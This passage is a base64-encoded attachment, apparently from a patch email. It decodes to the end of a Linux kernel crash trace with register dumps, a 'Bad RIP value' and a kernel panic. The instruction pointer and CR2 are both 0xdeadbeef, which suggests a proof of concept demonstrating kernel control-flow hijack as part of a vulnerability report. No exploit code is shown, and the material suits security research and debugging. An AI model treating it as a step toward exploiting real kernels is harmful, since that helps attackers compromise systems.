+dGgrMHg1My8weDYwClsgICAzMy4yNTcwMzhdICBlbnRyeV9TWVNDQUxMXzY0
+X2Zhc3RwYXRoKzB4OTIvMHg5NApbICAgMzMuMjU3MDM4XSBSSVA6IDAwMzM6
+MHg0MDBlNDAKWyAgIDMzLjI1NzAzOF0gUlNQOiAwMDJiOjAwMDA3ZmZmYzE3
+YjQyMDggRUZMQUdTOiAwMDAwMDI0NiBPUklHX1JBWDogMDAwMDAwMDAwMDAw
+MDAwMwpbICAgMzMuMjU3MDM4XSBSQVg6IDAwMDAwMDAwMDAwMDAwMDAgUkJY
+OiAwMDAwMDAwMDAwNDAwMmM4IFJDWDogMDAwMDAwMDAwMDQwMGU0MApbICAg
+MzMuMjU3MDM4XSBSRFg6IDAwMDAwMDAwMDAwMDAwMDAgUlNJOiAwMDAwMDAw
+MDAwMDAwMDAxIFJESTogMDAwMDAwMDAwMDAwMDAwNApbICAgMzMuMjU3MDM4
+XSBSQlA6IDAwMDA3ZmZmYzE3YjQyMjAgUjA4OiBmZmZmZmZmZmZmZmZmZmZm
+IFIwOTogMDAwMDAwMDAwMDAwMDAwMApbICAgMzMuMjU3MDM4XSBSMTA6IDAw
+MDAwMDAwMDAwMDAwMjEgUjExOiAwMDAwMDAwMDAwMDAwMjQ2IFIxMjogMDAw
+MDAwMDAwMDQwNjJhMApbICAgMzMuMjU3MDM4XSBSMTM6IDAwMDAwMDAwMDA0
+MDYzMzAgUjE0OiAwMDAwMDAwMDAwMDAwMDAwIFIxNTogMDAwMDAwMDAwMDAw
+MDAwMApbICAgMzMuMjU3MDM4XSBDb2RlOiAgQmFkIFJJUCB2YWx1ZS4KWyAg
+IDMzLjI1NzAzOF0gUklQOiAweGRlYWRiZWVmIFJTUDogZmZmZmM5MDAwMWNl
+ZmQ2OApbICAgMzMuMjU3MDM4XSBDUjI6IDAwMDAwMDAwZGVhZGJlZWYKWyAg
+IDMzLjI1NzAzOF0gLS0tWyBlbmQgdHJhY2UgMzkyY2NlNWJkMTA1NWY0ZSBd
+LS0tClsgICAzMy4yNTcwMzhdIEtlcm5lbCBwYW5pYyAtIG5vdCBzeW5jaW5n
+OiBGYXRhbCBleGNlcHRpb24gaW4gaW50ZXJydXB0ClsgICAzMy4yNTcwMzhd
+IEtlcm5lbCBPZmZzZXQ6IGRpc2FibGVkCgo=
+
+--f403043b2478f365ad055f8cadf0--
